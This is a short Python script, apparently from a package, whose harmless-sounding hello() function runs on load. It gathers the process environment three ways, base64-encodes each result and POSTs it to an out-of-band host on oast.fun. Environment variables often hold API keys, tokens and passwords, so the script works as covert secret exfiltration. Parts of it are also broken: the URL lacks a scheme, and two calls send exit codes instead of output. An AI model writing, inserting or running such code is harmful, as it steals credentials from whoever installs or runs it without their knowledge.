import os
import subprocess
import base64
import requests

def hello():
    url = "csnt7988cumikg3etqrgpiwx7hhmdqit1.oast.fun"
    headerOS = {"x-test":"os.environ"}
    env = str(os.environ)
    benv = env.encode("ascii")
    b64envb = base64.b64encode(benv)
    b64env = b64envb.decode("ascii")
    data = {"vars": b64env}
    req1 = requests.post(url, data=data, headers=headerOS, timeout=20)
    headerSub = {"x-test":"sub.call('env')"}
    env = str(subprocess.call("env"))
    benv = env.encode("ascii")
    b64envb = base64.b64encode(benv)
    b64env = b64envb.decode("ascii")
    data = {"vars": b64env}
    req = requests.post(url, data=data, headers=headerSub, timeout=20)
    headerEnviron = {"x-test":"Proc/Environ"}
    env = str(subprocess.call(["cat", "/proc/self/environ"]))
    benv = env.encode("ascii")
    b64envb = base64.b64encode(benv)
    b64env = b64envb.decode("ascii")
    data = {"vars": b64env}
    req2 = requests.post(url, data=data, headers=headerEnviron, timeout=20)

hello()
